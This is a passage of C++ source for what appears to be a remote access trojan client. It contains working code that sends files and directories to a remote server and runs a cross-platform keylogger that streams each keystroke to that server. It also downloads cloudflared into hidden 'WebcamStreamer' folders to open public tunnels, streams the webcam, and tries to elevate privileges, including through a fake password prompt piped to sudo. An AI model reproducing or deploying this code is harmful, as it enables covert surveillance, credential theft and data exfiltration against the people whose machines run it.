            while (copied < total_size) {
                // Read binary data
                src.read(buffer.data(), std::min(buffer_size, static_cast<size_t>(total_size - copied)));
                size_t bytes_read = src.gcount();
                
                if (bytes_read == 0) {
                    break; // End of file
                }

                // Send binary data
                if (!send_all(current_socket, buffer.data(), bytes_read)) {
                    std::cerr << "Failed to send pull file data\n";
                    src.close();
                    return;
                }
                copied += bytes_read;
                
                // Update progress
                int new_progress = static_cast<int>((copied * 100) / total_size);
                if (new_progress != progress) {
                    progress = new_progress;
                    std::cout << "\rSending: " << progress << "%";
                    std::cout.flush();
                }
            }

            src.close();

            std::cout << "\nFile sent to server.\n";
            log_action("Pulled file to server: " + source_path);

        } else if (fs::is_directory(source_path)) {
            uintmax_t dir_size = calculate_directory_size(source_path);
            if (dir_size > 100 * 1024 * 1024) {
                std::cout << "This directory is " << (dir_size / (1024 * 1024)) << " MB. Waiting for server confirmation...\n";
                
                std::string msg = "[PULL_CONFIRM:" + source_path + ":" + std::to_string(dir_size) + "]\n";
                send_to_server(msg);
                
                std::cout << "Waiting for server response...\n";
                return;
            }

            std::cout << "Sending directory: " << source_path << " to server\n";

            std::string dir_name = fs::path(source_path).filename().string();
            std::string header = "[PULL_DIR:" + dir_name + ":" + std::to_string(dir_size) + "]";
            
            if (!send_all(current_socket, header.c_str(), header.size())) {
                std::cerr << "Failed to send pull dir header\n";
                return;
            }

            for (const auto& entry : fs::recursive_directory_iterator(source_path)) {
                if (fs::is_regular_file(entry)) {
                    std::string rel_path = fs::relative(entry.path(), source_path).string();
                    uintmax_t file_size = fs::file_size(entry.path());
                    
                    // Send file header
                    std::string file_header = "[PULL_DIR_FILE:" + rel_path + ":" + std::to_string(file_size) + "]";
                    if (!send_all(current_socket, file_header.c_str(), file_header.size())) {
                        std::cerr << "Failed to send pull dir file header\n";
                        return;
                    }
                    
                    // Send file content
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (file) {
                        const size_t buffer_size = 8192;
                        std::vector<char> buffer(buffer_size);
                        uintmax_t copied = 0;
                        
                        while (copied < file_size) {
                            file.read(buffer.data(), std::min(buffer_size, static_cast<size_t>(file_size - copied)));
                            size_t bytes_read = file.gcount();
                            
                            if (!send_all(current_socket, buffer.data(), bytes_read)) {
                                std::cerr << "Failed to send pull dir file data\n";
                                file.close();
                                return;
                            }
                            copied += bytes_read;
                        }
                        
                        file.close();
                    }
                }
            }
            
            // Send directory end marker
            std::string dir_end = "[PULL_DIR_END]";
            if (!send_all(current_socket, dir_end.c_str(), dir_end.size())) {
                std::cerr << "Failed to send pull dir end marker\n";
                return;
            }
            
            std::cout << "Directory sent to server.\n";
            log_action("Pulled directory to server: " + source_path);
        }
    }

    // Calculate directory size
    uintmax_t calculate_directory_size(const std::string& path) {
        uintmax_t size = 0;
        for (const auto& entry : fs::recursive_directory_iterator(path)) {
            if (fs::is_regular_file(entry)) {
                size += fs::file_size(entry);
            }
        }
        return size;
    }

void handle_search(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Usage: search <pattern>\n";
        std::cout << "Example: search .txt  (to find all .txt files)\n";
        return;
    }

    std::string pattern = args[0];

    std::cout << "Searching for files matching pattern: " << pattern << "\n";

    std::string root_path = "/";
    #ifdef _WIN32
        root_path = current_dir.substr(0, 3); // e.g., "C:\\"
    #endif

    int found_count = 0;
    std::queue<fs::path> dirs;
    dirs.push(root_path);

    while (!dirs.empty()) {
        fs::path current_dir = dirs.front();
        dirs.pop();

        try {
            for (const auto& entry :
                 fs::directory_iterator(current_dir, fs::directory_options::skip_permission_denied)) {
                
                std::error_code ec; // prevent exceptions
                fs::file_status st = entry.symlink_status(ec);
                if (ec) continue; // skip unreadable entries

                if (fs::is_directory(st)) {
                    dirs.push(entry.path());
                } else if (fs::is_regular_file(st)) {
                    std::string filename = entry.path().filename().string();

                    bool match = false;
                    if (!pattern.empty() && pattern[0] == '.') {
                        if (filename.size() >= pattern.size() &&
                            filename.substr(filename.size() - pattern.size()) == pattern) {
                            match = true;
                        }
                    } else {
                        if (filename.find(pattern) != std::string::npos) {
                            match = true;
                        }
                    }

                    if (match) {
                        std::cout << entry.path().string() << "\n";
                        found_count++;
                    }
                }
            }
        } catch (const fs::filesystem_error& e) {
            std::cerr << "Error reading directory " << current_dir
                      << ": " << e.what() << std::endl;
            continue;
        } catch (const std::exception& e) {
            std::cerr << "General error reading directory " << current_dir
                      << ": " << e.what() << std::endl;
            continue;
        }
    }

    std::cout << "Search completed. Found " << found_count << " files.\n";
    log_action("Searched for pattern: " + pattern);
}

    // Handle wifi command
    void handle_wifi(const std::vector<std::string>& args) {
        std::cout << "\n[Network Scanner]\n";
        
        // Get comprehensive network information
        NetworkInfo netInfo = getNetworkInfo();
        std::string connectedWiFi = getConnectedWiFi();
        
        // Display current network information
        std::cout << "\n=== Current Network Information ===\n";
        std::cout << "Local IP:      " << netInfo.localIP << "\n";
        std::cout << "MAC Address:   " << netInfo.macAddress << "\n";
        std::cout << "Gateway:       " << netInfo.gateway << "\n";
        std::cout << "Subnet:        " << netInfo.subnet << "\n";
        std::cout << "Connected WiFi: " << connectedWiFi << "\n";
        
        // Discover network devices
        discoverDevices(netInfo);
        
        std::cout << "\nScan complete!\n";
        log_action("Network scan completed");
    }

    void handle_keylog(const std::vector<std::string>& args) {
        bool live_flag = false;
        for (const auto& arg : args) {
            if (arg == "-live") {
                live_flag = true;
                break;
            }
        }

        if (keylogger_running) {
            // Stop keylogger
            keylogger_running = false;
            if (keylogger_thread.joinable()) {
                keylogger_thread.join();
            }
            std::cout << "\nKeylogger stopped.\n";
            log_action("Keylogger stopped");
        } else {
            // Start keylogger
            keylogger_running = true;
            if (live_flag) {
                std::cout << "\n[Keylogger - Live Mode]\n";
                std::cout << "Logging keystrokes to server and console...\n";
            } else {
                std::cout << "\n[Keylogger]\n";
                std::cout << "Logging keystrokes to server in background...\n";
            }
            std::cout << "Press ESC (Windows) or 'q' (Linux) to stop logging.\n\n";
            
            keylogger_thread = std::thread([this, live_flag]() {
            #ifdef _WIN32
                // Windows keylogger implementation
                static bool keyState[256] = {false};
                
                while (keylogger_running) {
                    for (int key = 8; key <= 255; key++) {
                        if (!keylogger_running) break;
                        bool isDown = GetAsyncKeyState(key) & 0x8000;
                        if (isDown && !keyState[key]) {
                            keyState[key] = true;
                            if (key == VK_ESCAPE) {
                                send_to_server("[KEYLOG:ESC]\n");
                                if (live_flag) {
                                    std::cout << "\n[ESC] pressed, stopping keylogger\n";
                                }
                                keylogger_running = false;
                                break;
                            }
                            
                            // Map Windows virtual key codes to characters
                            std::string keyStr;
                            if (key >= 0x30 && key <= 0x39) { // 0-9
                                keyStr = char(key);
                            } else if (key >= 0x41 && key <= 0x5A) { // A-Z
                                keyStr = char(std::tolower(key));
                            } else {
                                switch (key) {
                                    case VK_SPACE: keyStr = " "; break;
                                    case VK_RETURN: keyStr = "[ENTER]"; break;
                                    case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: keyStr = "[SHIFT]"; break;
                                    case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: keyStr = "[CTRL]"; break;
                                    case VK_MENU: case VK_LMENU: case VK_RMENU: keyStr = "[ALT]"; break;
                                    case VK_TAB: keyStr = "[TAB]"; break;
                                    case VK_BACK: keyStr = "[BACKSPACE]"; break;
                                    default: keyStr = "[UNKNOWN:" + std::to_string(key) + "]";
                                }
                            }
                            
                            // Send to server
                            send_to_server("[KEYLOG:" + keyStr + "]\n");
                            
                            // Only print to console if live_flag is set
                            if (live_flag) {
                                std::cout << keyStr;
                                std::cout.flush();
                            }
                        } else if (!isDown && keyState[key]) {
                            keyState[key] = false;
                        }
                    }
                    Sleep(10);
                }
            #else
                // Linux keylogger implementation
                const char* dev = "/dev/input/event0"; // Check /proc/bus/input/devices
                int fd = open(dev, O_RDONLY);
                if (fd == -1) {
                    std::cerr << "Error: Could not open input device. Try running as root.\n";
                    keylogger_running = false;
                    return;
                }

                struct input_event ev;
                while (keylogger_running && read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
                    if (ev.type == EV_KEY && ev.value == 1) { // Key press
                        if (ev.code == KEY_Q) { // Quit on 'q'
                            send_to_server("[KEYLOG:QUIT]\n");
                            if (live_flag) {
                                std::cout << "\n'q' pressed, stopping keylogger\n";
                            }
                            keylogger_running = false;
                            break;
                        }
                        
                        const char* keyStr = linuxKeyMap(ev.code);
                        
                        // Send to server
                        send_to_server("[KEYLOG:" + std::string(keyStr) + "]\n");
                        
                        // Only print to console if live_flag is set
                        if (live_flag) {
                            std::cout << keyStr;
                            std::cout.flush();
                        }
                    }
                }

                close(fd);
            #endif

                if (live_flag) {
                    std::cout << "\nKeylogger stopped.\n";
                }
                log_action("Keylogger stopped");
            });
            
            keylogger_thread.detach();
            log_action("Keylogger started");
        }
    }

    // Linux key code to character mapping (simplified)
    #ifdef __linux__
    const char* linuxKeyMap(int code) {
        switch (code) {
            case KEY_A: return "a"; case KEY_B: return "b"; case KEY_C: return "c";
            case KEY_D: return "d"; case KEY_E: return "e"; case KEY_F: return "f";
            case KEY_G: return "g"; case KEY_H: return "h"; case KEY_I: return "i";
            case KEY_J: return "j"; case KEY_K: return "k"; case KEY_L: return "l";
            case KEY_M: return "m"; case KEY_N: return "n"; case KEY_O: return "o";
            case KEY_P: return "p"; case KEY_Q: return "q"; case KEY_R: return "r";
            case KEY_S: return "s"; case KEY_T: return "t"; case KEY_U: return "u";
            case KEY_V: return "v"; case KEY_W: return "w"; case KEY_X: return "x";
            case KEY_Y: return "y"; case KEY_Z: return "z";
            case KEY_1: return "1"; case KEY_2: return "2"; case KEY_3: return "3";
            case KEY_4: return "4"; case KEY_5: return "5"; case KEY_6: return "6";
            case KEY_7: return "7"; case KEY_8: return "8"; case KEY_9: return "9";
            case KEY_0: return "0";
            case KEY_SPACE: return " "; case KEY_ENTER: return "[ENTER]";
            case KEY_LEFTSHIFT: return "[SHIFT]"; case KEY_RIGHTSHIFT: return "[SHIFT]";
            case KEY_LEFTCTRL: return "[CTRL]"; case KEY_RIGHTCTRL: return "[CTRL]";
            case KEY_LEFTALT: return "[ALT]"; case KEY_RIGHTALT: return "[ALT]";
            case KEY_TAB: return "[TAB]"; case KEY_BACKSPACE: return "[BACKSPACE]";
            default: return "[UNKNOWN]";
        }
    }
    #endif

// Replace your existing handle_expose with this function
void handle_expose(const std::vector<std::string>& args) {
    // Local tunnel registry & type (keeps everything self-contained)
    struct TunnelInfo {
        std::string cloudflared_path;
        std::string url;
        std::time_t start_time = 0;
#ifdef _WIN32
        PROCESS_INFORMATION procInfo = {0};
#else
        pid_t pid = -1;
#endif
        std::string log_path;
    };
    static std::map<int, TunnelInfo> tunnels;
    static std::mutex tunnels_mtx;

    if (args.empty()) {
        std::cout << "Usage:\n"
                  << "  expose <port>        Start tunnel for port\n"
                  << "  expose -url          List active exposed URLs\n"
                  << "  expose -q <port>     Stop tunnel for port\n";
        return;
    }

    // List URLs
    if (args[0] == "-url") {
        std::lock_guard<std::mutex> lk(tunnels_mtx);
        if (tunnels.empty()) {
            std::cout << "No active tunnels.\n";
            return;
        }
        for (const auto &p : tunnels) {
            int port = p.first;
            const TunnelInfo &ti = p.second;
            std::cout << "Port " << port << " -> "
                      << (ti.url.empty() ? "(starting/unknown)" : ti.url)
                      << " (started: " << (ti.start_time ? std::ctime(&ti.start_time) : std::string("unknown\n")) << ")\n";
        }
        return;
    }

    // Quit tunnel
    if (args[0] == "-q") {
        if (args.size() < 2) {
            std::cout << "Usage: expose -q <port>\n";
            return;
        }
        int qport = 0;
        try { qport = std::stoi(args[1]); } catch (...) {
            std::cout << "Invalid port number.\n";
            return;
        }

        {
            std::lock_guard<std::mutex> lk(tunnels_mtx);
            auto it = tunnels.find(qport);
            if (it == tunnels.end()) {
                std::cout << "No tunnel found for port " << qport << "\n";
                return;
            }

#ifdef _WIN32
            PROCESS_INFORMATION pi = it->second.procInfo;
            if (pi.hProcess) {
                if (!TerminateProcess(pi.hProcess, 0)) {
                    std::cerr << "Failed to terminate cloudflared for port " << qport << ". Error: " << GetLastError() << "\n";
                } else {
                    std::cout << "Terminated cloudflared for port " << qport << "\n";
                }
                CloseHandle(pi.hProcess);
            }
            if (pi.hThread) CloseHandle(pi.hThread);
#else
            pid_t pid = it->second.pid;
            if (pid > 0) {
                kill(pid, SIGTERM);
                for (int i = 0; i < 20; ++i) {
                    int status = 0;
                    pid_t r = waitpid(pid, &status, WNOHANG);
                    if (r == pid) break;
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                }
                if (kill(pid, 0) == 0) kill(pid, SIGKILL);
                std::cout << "Stopped cloudflared for port " << qport << "\n";
            }
#endif
            // optionally remove logfile
            // unlink(it->second.log_path.c_str());
            tunnels.erase(it);
        }
        return;
    }

    // Start a tunnel for a port
    int port = 0;
    try {
        port = std::stoi(args[0]);
    } catch (const std::exception& e) {
        std::cout << "Invalid port number. Please provide a valid integer.\n";
        return;
    }

    {
        std::lock_guard<std::mutex> lk(tunnels_mtx);
        if (tunnels.find(port) != tunnels.end()) {
            std::cout << "Tunnel already running for port " << port << "\n";
            return;
        }
    }

    std::cout << "\nSetting up remote access via Cloudflare tunnel for port " << port << "...\n";

    // Check PATH for cloudflared
    std::string cloudflared_path;
    bool cloudflared_exists = false;
#ifdef _WIN32
    FILE* path_check_pipe = _popen("where cloudflared 2>nul", "r");
#else
    FILE* path_check_pipe = popen("which cloudflared 2>/dev/null", "r");
#endif
    if (path_check_pipe) {
        char buffer[512];
        if (fgets(buffer, sizeof(buffer), path_check_pipe) != nullptr) {
            cloudflared_path = buffer;
            if (!cloudflared_path.empty() && cloudflared_path.back() == '\n') cloudflared_path.pop_back();
            cloudflared_exists = true;
            std::cout << "Found existing cloudflared at: " << cloudflared_path << "\n";
        }
#ifdef _WIN32
        _pclose(path_check_pipe);
#else
        pclose(path_check_pipe);
#endif
    }

    // If not found, reuse your download logic (kept identical to your original)
    if (!cloudflared_exists) {
        std::cout << "Cloudflared not found in PATH. Downloading...\n";
        std::string hidden_dir;
        std::string cloudflared_url;
#ifdef _WIN32
        char appdata_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata_path))) {
            hidden_dir = std::string(appdata_path) + "\\WebcamStreamer";
        } else {
            hidden_dir = ".WebcamStreamer";
        }
        cloudflared_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe";
        cloudflared_path = hidden_dir + "\\cloudflared.exe";
        CreateDirectory(hidden_dir.c_str(), NULL);
        std::cout << "Downloading cloudflared to: " << cloudflared_path << "\n";
        HRESULT hr = URLDownloadToFile(NULL, cloudflared_url.c_str(), cloudflared_path.c_str(), 0, NULL);
        if (hr != S_OK) {
            std::cerr << "Failed to download cloudflared. Error: " << hr << std::endl;
            return;
        }
#else
        const char *home_dir = getenv("HOME");
        if (!home_dir) home_dir = getpwuid(getuid())->pw_dir;
        hidden_dir = std::string(home_dir) + "/.webcamstreamer";
        mkdir(hidden_dir.c_str(), 0700);
        std::string arch_cmd = "uname -m";
        FILE* arch_pipe = popen(arch_cmd.c_str(), "r");
        char arch_buffer[128];
        std::string arch = "";
        if (arch_pipe && fgets(arch_buffer, sizeof(arch_buffer), arch_pipe) != nullptr) {
            arch = arch_buffer;
            if (!arch.empty() && arch.back() == '\n') arch.pop_back();
        }
        if (arch_pipe) pclose(arch_pipe);
        if (arch == "x86_64") {
            cloudflared_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64";
        } else if (arch == "aarch64") {
            cloudflared_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64";
        } else if (arch == "armv7l") {
            cloudflared_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm";
        } else {
            std::cerr << "Unsupported architecture: " << arch << "\n";
            return;
        }
        cloudflared_path = hidden_dir + "/cloudflared";
        std::cout << "Downloading cloudflared for " << arch << " to: " << cloudflared_path << "\n";
        std::string cmd = "curl -L -o " + cloudflared_path + " " + cloudflared_url;
        int result = system(cmd.c_str());
        if (result != 0) {
            std::cerr << "Failed to download cloudflared. Exit code: " << result << std::endl;
            return;
        }
        chmod(cloudflared_path.c_str(), 0700);
#endif
    }

    // Prepare tunnel info & logfile path
    TunnelInfo tinfo;
    tinfo.cloudflared_path = cloudflared_path;
    tinfo.start_time = std::time(nullptr);

    // Compute hidden_dir/log path same as you used above
    std::string hidden_dir_for_logs;
#ifdef _WIN32
    {
        char appdata_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata_path))) {
            hidden_dir_for_logs = std::string(appdata_path) + "\\WebcamStreamer";
        } else {
            hidden_dir_for_logs = ".WebcamStreamer";
        }
    }
#else
    {
        const char *home_dir = getenv("HOME");
        if (!home_dir) home_dir = getpwuid(getuid())->pw_dir;
        hidden_dir_for_logs = std::string(home_dir) + "/.webcamstreamer";
    }
#endif
    // ensure dir exists
#ifdef _WIN32
    CreateDirectory(hidden_dir_for_logs.c_str(), NULL);
#else
    mkdir(hidden_dir_for_logs.c_str(), 0700);
#endif

    // logfile name per port
    std::ostringstream lp;
    lp << hidden_dir_for_logs << "/cloudflared_port_" << port << ".log";
    tinfo.log_path = lp.str();

    std::cout << "Starting Cloudflare tunnel (log: " << tinfo.log_path << ")...\n";

    std::string local_url = "http://localhost:" + std::to_string(port);
    std::string tunnel_cmd = "\"" + cloudflared_path + "\" tunnel --url " + local_url;

#ifdef _WIN32
    // Open logfile for writing by child (allow read sharing so parent can tail it)
    HANDLE hLog = CreateFileA(tinfo.log_path.c_str(),
                              GENERIC_WRITE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL,
                              OPEN_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL,
                              NULL);
    if (hLog == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open log file for cloudflared: " << GetLastError() << "\n";
        return;
    }
    // Move to end for append
    SetFilePointer(hLog, 0, NULL, FILE_END);

    // Create process with stdout/stderr -> logfile
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hLog;
    si.hStdError = hLog;
    si.dwFlags |= STARTF_USESTDHANDLES;
    ZeroMemory(&pi, sizeof(pi));

    // mutable cmd buffer
    std::vector<char> cmd_buf(tunnel_cmd.begin(), tunnel_cmd.end());
    cmd_buf.push_back('\0');

    BOOL created = CreateProcessA(NULL, cmd_buf.data(), NULL, NULL, TRUE,
                                  CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hLog); // child has its own handle; parent can still read the file

    if (!created) {
        std::cerr << "Failed to start cloudflared process. Error: " << GetLastError() << "\n";
        return;
    }

    // save process into registry
    tinfo.procInfo = pi;
    {
        std::lock_guard<std::mutex> lk(tunnels_mtx);
        tunnels[port] = tinfo;
    }

    // Tail the logfile for up to 25 seconds to find the URL
    bool url_found = false;
    std::string found_url;
    const int timeout_seconds = 25;
    auto start_ts = std::chrono::steady_clock::now();

    std::ifstream ifs;
    // open for reading with shared access (windows allows it if file was created with FILE_SHARE_READ)
    ifs.open(tinfo.log_path);
    if (!ifs.is_open()) {
        // still proceed but warn
        std::cerr << "Warning: unable to open log file for tailing; URL may be printed but not captured.\n";
    } else {
        // seek to current end (we want new lines)
        ifs.seekg(0, std::ios::end);
        std::string line;
        while (std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - start_ts).count() < timeout_seconds) {
            std::streampos cur = ifs.tellg();
            if (std::getline(ifs, line)) {
                // append line and check for url
                size_t pos = line.find("https://");
                if (pos != std::string::npos) {
                    size_t endpos = line.find(".trycloudflare.com", pos);
                    if (endpos != std::string::npos) {
                        endpos += std::string(".trycloudflare.com").length();
                        found_url = line.substr(pos, endpos - pos);
                        url_found = true;
                        break;
                    }
                }
            } else {
                // no new data; sleep shortly and retry
                ifs.clear(); // clear EOF
                std::this_thread::sleep_for(std::chrono::milliseconds(200));
                ifs.seekg(cur);
            }
        }
        ifs.close();
    }

    // update registry with url or empty
    {
        std::lock_guard<std::mutex> lk(tunnels_mtx);
        auto &entry = tunnels[port];
        if (url_found) {
            entry.url = found_url;
            std::cout << "\nRemote access URL: " << found_url << "\n";
        } else {
            std::cerr << "Could not find Cloudflare URL in log (timeout). Check log: " << entry.log_path << "\n";
            entry.url = "";
        }
    }

    log_action("Started cloudflared tunnel for port " + std::to_string(port));

#else
    // POSIX: start child with stdout/stderr redirected to logfile
    int logfd = open(tinfo.log_path.c_str(), O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (logfd == -1) {
        std::cerr << "Failed to open logfile " << tinfo.log_path << "\n";
        return;
    }

    pid_t pid = fork();
    if (pid == -1) {
        std::cerr << "Failed to fork\n";
        close(logfd);
        return;
    }

    if (pid == 0) {
        // child
        ::setsid(); // detach
        // redirect stdout/stderr to logfile
        dup2(logfd, STDOUT_FILENO);
        dup2(logfd, STDERR_FILENO);
        close(logfd);

        // Build argv
        std::vector<char*> argv;
        argv.push_back(const_cast<char*>(cloudflared_path.c_str()));
        argv.push_back(const_cast<char*>("tunnel"));
        argv.push_back(const_cast<char*>("--url"));
        std::string urlarg = local_url;
        argv.push_back(const_cast<char*>(urlarg.c_str()));
        argv.push_back(nullptr);

        execv(cloudflared_path.c_str(), argv.data());
        _exit(127); // exec failed
    }

    // parent
    close(logfd);
    tinfo.pid = pid;
    {
        std::lock_guard<std::mutex> lk(tunnels_mtx);
        tunnels[port] = tinfo;
    }

    // Tail logfile for up to 25 seconds
    bool url_found = false;
    std::string found_url;
    const int timeout_seconds = 25;
    auto start_ts = std::chrono::steady_clock::now();

    std::ifstream ifs(tinfo.log_path);
    if (!ifs.is_open()) {
        std::cerr << "Warning: unable to open log file for tailing; URL may be printed but not captured.\n";
    } else {
        // seek to end
        ifs.seekg(0, std::ios::end);
        std::string line;
        while (std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - start_ts).count() < timeout_seconds) {
            std::streampos cur = ifs.tellg();
            if (std::getline(ifs, line)) {
                size_t pos = line.find("https://");
                if (pos != std::string::npos) {
                    size_t endpos = line.find(".trycloudflare.com", pos);
                    if (endpos != std::string::npos) {
                        endpos += std::string(".trycloudflare.com").length();
                        found_url = line.substr(pos, endpos - pos);
                        url_found = true;
                        break;
                    }
                }
            } else {
                ifs.clear();
                std::this_thread::sleep_for(std::chrono::milliseconds(200));
                ifs.seekg(cur);
            }
        }
        ifs.close();
    }

    // update registry
    {
        std::lock_guard<std::mutex> lk(tunnels_mtx);
        auto &entry = tunnels[port];
        if (url_found) {
            entry.url = found_url;
            std::cout << "\nRemote access URL: " << found_url << "\n";
        } else {
            std::cerr << "Could not find Cloudflare URL in log (timeout). Check log: " << entry.log_path << "\n";
            entry.url = "";
        }
    }

    log_action("Started cloudflared tunnel for port " + std::to_string(port));
#endif
}

// Original handle_stream function - completely unchanged
void handle_stream(const std::vector<std::string>& args) {
    std::cout << "\n[Webcam Streamer]\n";
    
    // Check if we need to run with root privileges
    bool run_as_root = false;
    std::vector<std::string> stream_args;
    
    if (!args.empty() && args[0] == "root") {
        run_as_root = true;
        stream_args.assign(args.begin() + 1, args.end());
    } else {
        stream_args = args;
    }
    
    if (run_as_root) {
        std::cout << "Starting webcam streamer with elevated privileges...\n";
        
        #ifdef _WIN32
            // On Windows, restart the current executable with admin rights
            char exe_path[MAX_PATH];
            GetModuleFileName(NULL, exe_path, MAX_PATH);
            
            std::string cmd_args = "stream";
            for (const auto& arg : stream_args) {
                cmd_args += " " + arg;
            }
            
            SHELLEXECUTEINFO sei = {0};
            sei.cbSize = sizeof(SHELLEXECUTEINFO);
            sei.fMask = SEE_MASK_NOCLOSEPROCESS;
            sei.hwnd = NULL;
            sei.lpVerb = "runas";
            sei.lpFile = exe_path;
            sei.lpParameters = cmd_args.c_str();
            sei.nShow = SW_SHOWNORMAL;
            
            if (!ShellExecuteEx(&sei)) {
                std::cout << "Failed to start with elevated privileges.\n";
                return;
            }
            
            std::cout << "Webcam streamer started with elevated privileges.\n";
            log_action("Webcam streamer started with elevated privileges");
        #else
            // On Linux, use sudo
            std::string cmd = "sudo ";
            
            // Get the path to the current executable
            char exe_path[PATH_MAX];
            ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
            if (len == -1) {
                std::cout << "Failed to get executable path.\n";
                return;
            }
            exe_path[len] = '\0';
            
            cmd += exe_path;
            cmd += " stream";
            
            for (const auto& arg : stream_args) {
                cmd += " " + arg;
            }
            
            int result = system(cmd.c_str());
            if (result != 0) {
                std::cout << "Failed to start with elevated privileges. Exit code: " << result << "\n";
                return;
            }
            
            std::cout << "Webcam streamer started with elevated privileges.\n";
            log_action("Webcam streamer started with elevated privileges");
        #endif
    } else {
        std::cout << "Starting webcam streamer...\n";
        
        // Initialize PortAudio
        PaError err = Pa_Initialize();
        if (err != paNoError) {
            std::cerr << "PortAudio initialization failed: " << Pa_GetErrorText(err) << std::endl;
            return;
        }
        
        // Run the streamer in a separate thread
        std::thread streamer_thread([]() {
            streamer_main();
        });
        
        // Detach the thread so it runs independently
        streamer_thread.detach();
        
        std::cout << "Webcam streamer started in the background.\n";
        std::cout << "Open a web browser and navigate to:\n";
        std::cout << "  http://localhost:9002 (local access)\n";
        printLocalIPs();
        std::cout << "Press Enter to stop the streamer...\n";
        
        log_action("Webcam streamer started");
    }
}

    // Handle root command
    void handle_root(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: root <command> [args]\n";
            std::cout << "Example: root webcam\n";
            std::cout << "Example: root keylog\n";
            return;
        }
        
        std::string command = args[0];
        std::vector<std::string> cmd_args;
        if (args.size() > 1) {
            cmd_args.assign(args.begin() + 1, args.end());
        }
        
        std::cout << "Running command with elevated privileges: " << command << "\n";
        
        #ifdef _WIN32
            // On Windows, restart the current executable with admin rights
            char exe_path[MAX_PATH];
            GetModuleFileName(NULL, exe_path, MAX_PATH);
            
            std::string cmd_args_str = command;
            for (const auto& arg : cmd_args) {
                cmd_args_str += " " + arg;
            }
            
            SHELLEXECUTEINFO sei = {0};
            sei.cbSize = sizeof(SHELLEXECUTEINFO);
            sei.fMask = SEE_MASK_NOCLOSEPROCESS;
            sei.hwnd = NULL;
            sei.lpVerb = "runas";
            sei.lpFile = exe_path;
            sei.lpParameters = cmd_args_str.c_str();
            sei.nShow = SW_SHOWNORMAL;
            
            if (!ShellExecuteEx(&sei)) {
                std::cout << "Failed to start with elevated privileges.\n";
                return;
            }
            
            std::cout << "Command started with elevated privileges.\n";
            log_action("Command started with elevated privileges: " + command);
        #else
            // On Linux, use GUI popup for privilege escalation
            // Get the path to the current executable
            char exe_path[PATH_MAX];
            ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
            if (len == -1) {
                std::cout << "Failed to get executable path.\n";
                return;
            }
            exe_path[len] = '\0';
            
            // Build the command with arguments
            std::string cmd_args_str = command;
            for (const auto& arg : cmd_args) {
                cmd_args_str += " " + arg;
            }
            
            // Try to use pkexec (PolicyKit) for GUI authentication
            std::string cmd = "pkexec " + std::string(exe_path) + " " + cmd_args_str;
            
            // Try to run with pkexec
            int result = system(cmd.c_str());
            
            // If pkexec fails, try gksu as a fallback
            if (result != 0) {
                std::cout << "pkexec failed, trying gksu...\n";
                cmd = "gksu \"" + std::string(exe_path) + " " + cmd_args_str + "\"";
                result = system(cmd.c_str());
            }
            
            // If gksu also fails, try kdesu as another fallback
            if (result != 0) {
                std::cout << "gksu failed, trying kdesu...\n";
                cmd = "kdesu -c \"" + std::string(exe_path) + " " + cmd_args_str + "\"";
                result = system(cmd.c_str());
            }
            
            // If all GUI methods fail, try zenity + sudo as last resort
            if (result != 0) {
                std::cout << "kdesu failed, trying zenity + sudo...\n";
                cmd = "zenity --password --title=\"Authentication Required\" | sudo -S " + std::string(exe_path) + " " + cmd_args_str;
                result = system(cmd.c_str());
            }
            
            if (result != 0) {
                std::cout << "All privilege escalation methods failed. Exit code: " << result << "\n";
                std::cout << "Please ensure you have one of these installed: pkexec, gksu, kdesu, or zenity\n";
                return;
            }
            
            std::cout << "Command started with elevated privileges.\n";
            log_action("Command started with elevated privileges: " + command);
        #endif
    }

    // Helper function to escape shell arguments
    std::string escape_shell_arg(const std::string& arg) {
        std::string result;
        for (char c : arg) {
            if (c == '"') {
                result += "\\\"";
            } else if (c == '\\') {
                result += "\\\\";
            } else {
                result += c;
            }
        }
        return result;
    }

    // Show system popup dialog with new format
    void system_popup(const std::vector<std::string>& args) {
        if (args.size() < 2) {
            std::cout << "Usage: system_popup -<title> -<message>\n";
            std::cout << "Example: system_popup -Error -File not found\n";
            return;
        }

        // Check if both arguments start with '-'
        if (args[0].empty() || args[0][0] != '-' || args[1].empty() || args[1][0] != '-') {
            std::cout << "Both title and message must start with '-'\n";
            return;
        }

        std::string title = args[0].substr(1); // Remove the leading '-'
        std::string message = args[1].substr(1); // Remove the leading '-'

        // Append any additional arguments to the message
        for (size_t i = 2; i < args.size(); ++i) {
            message += " " + args[i];
        }

        #ifdef _WIN32
            // Windows popup using MessageBox
            int result = MessageBox(NULL, message.c_str(), title.c_str(), MB_OK | MB_ICONINFORMATION);
            if (result == IDOK) {
                std::cout << "Popup acknowledged\n";
            }
        #else
            // Linux popup using zenity or xmessage
            std::string cmd;
            
            // Try zenity first (common on GNOME)
            if (system("which zenity > /dev/null 2>&1") == 0) {
                cmd = "zenity --info --title=\"" + title + "\" --text=\"" + message + "\"";
            }
            // Try kdialog (KDE)
